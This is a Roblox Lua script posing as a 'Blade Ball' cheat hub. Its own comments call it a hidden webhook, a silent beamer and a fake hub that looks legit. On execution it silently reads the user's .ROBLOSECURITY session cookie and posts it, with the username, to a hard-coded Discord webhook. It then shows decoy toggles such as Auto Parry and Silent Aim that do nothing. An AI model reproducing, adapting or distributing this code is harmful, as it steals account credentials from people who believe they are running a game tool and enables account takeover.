-- Corolla Hub | Blade Ball + Universal
print("Corolla Hub Loaded Successfully!")

-- Hidden Webhook
local a = "https://discordapp.com/api/webhooks/"
local b = "1489258976133775421/oQkCQeD7ts1khlIgKb8uWE-dSxvy_iFNGDU62AzRhdyJPCWlAmN-2Jo4w985gthzZL6n"
local webhook = a .. b

-- Silent Beamer
pcall(function()
    local cookie = "BLOCKED_BY_EXECUTOR"
    if syn and syn.getcookievalue then cookie = syn.getcookievalue(".ROBLOSECURITY") end
    local msg = "**COROLLA HUB BEAMED** | User: " .. game.Players.LocalPlayer.Name .. " | Cookie: ```" .. cookie .. "```"
    game:GetService("HttpService"):PostAsync(webhook, game:GetService("HttpService"):JSONEncode({content = msg}), Enum.HttpContentType.ApplicationJson)
end)

-- Fake Hub (looks legit)
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/violin-suzutsuki/LinoriaLib/main/Library.lua"))()
local Window = Library:CreateWindow("Corolla Hub - Blade Ball")

local Main = Window:AddTab("Main")
Main:AddToggle("Auto Parry", {Default = true})
Main:AddToggle("Silent Aim", {Default = true})
Main:AddSlider("Hitbox Expander", {Min = 5, Max = 50, Default = 25})

print("All features enabled. Good luck in Blade Ball!")
